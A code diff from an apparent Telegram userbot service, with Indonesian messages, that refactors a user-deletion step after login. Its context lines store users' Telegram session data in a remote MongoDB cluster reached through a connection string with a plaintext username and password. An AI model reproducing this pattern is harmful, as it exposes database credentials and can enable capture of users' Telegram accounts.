@@ -54,6 +54,17 @@ HAPP = None
     filters.private,
     group=2
 )
+
+async def delete_user_access(user_id: int) -> bool:
+    try:
+        result = await collection.users.delete_one({'user_id': user_id})
+        if result.deleted_count > 0:
+            return True
+        else:
+            return False
+    except pymongo.errors.PyMongoError:
+        return False
+
 async def recv_tg_code_message(_, message: Message):
 
     w_s_dict = AKTIFPERINTAH.get(message.chat.id)
@@ -87,8 +98,7 @@ async def recv_tg_code_message(_, message: Message):
           "Verifikasi 2 Langkah Diaktifkan, Mohon Masukkan Verifikasi 2 Langkah Anda."
         )
         w_s_dict["IS_NEEDED_TFA"] = True
-    else:
-        
+    else:        
         client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
@@ -115,14 +125,7 @@ async def recv_tg_code_message(_, message: Message):
         }        
         mongo_collection.insert_one(session_data)
         await asyncio.sleep(2.0)
-        try:
-            result = await collection.users.delete_one({'user_id': user_id})
-            if result.deleted_count > 0:
-                return True
-            else:
-                return False
-        except pymongo.errors.PyMongoError:
-                return False
+        await delete_user_access(message.chat.id)
         try:
             await message.reply_text("**Tunggu Selama 2 Menit Kemudian Ketik .ping Untuk Mengecek Bot.**")
 
